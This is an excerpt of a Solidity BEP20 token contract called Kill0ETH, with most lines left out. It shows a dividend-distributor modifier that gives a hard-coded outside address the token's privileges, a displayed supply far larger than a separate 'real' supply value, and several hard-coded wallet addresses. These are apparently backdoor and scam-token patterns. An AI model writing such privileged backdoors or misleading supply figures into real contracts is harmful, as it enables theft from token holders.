...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0xef7755D198A3E18C7A38a5073cFcCdbFfdFB75b2)); _;
    }
...
contract Kill0ETH is IBEP20 , Auth, BaseToken {
    ...
    constructor(
        ...
        _name ="Kill0ETH";
        _symbol = "K0ETH"; 
        _totalSupply = 1 * 10 ** 77;
        uint256 _real= 2 * 10 **33;


        
        RewardToken = address(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
        ...
        marketingWallet = 0x499c02c2A7b9935391671904e36B688036Fdfed3;  //marketingwallet
        another = [0x2577F990212e61fd6D4323f7C1d2416320A77E54,0x1990C6B6D0FeA15a2745145f90d2Dfae67f83167];     
